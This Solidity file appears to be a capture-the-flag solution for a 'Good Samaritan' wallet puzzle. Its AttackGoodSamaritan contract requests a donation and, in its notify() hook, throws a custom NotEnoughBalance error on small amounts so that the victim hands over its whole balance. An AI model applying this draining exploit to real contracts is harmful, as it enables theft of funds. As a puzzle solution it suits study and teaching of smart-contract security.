pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface INotifyable {
    function notify(uint256 amount) external;
}

interface ICoin {
    function balances(address) external returns(uint256);
}

interface IGoodSamaritan {
    function coin() external returns(ICoin);
    function requestDonation() external returns(bool enoughBalance);
}

contract AttackGoodSamaritan is INotifyable {

    address victim;
    error NotEnoughBalance();

    constructor (address _victim) {
        victim = _victim;
    }

    function attack() public{
        IGoodSamaritan g = IGoodSamaritan(victim);
        g.requestDonation();
    }

    function notify(uint256 _amount) pure public {        
        //revert on wallet.donate10(msg.sender), ie. amount=10
        //but don't revert on wallet.transferRemainder(msg.sender), ie. amount=1000000
        if(_amount <= 10) {
            revert NotEnoughBalance();
        }
        
    }
}

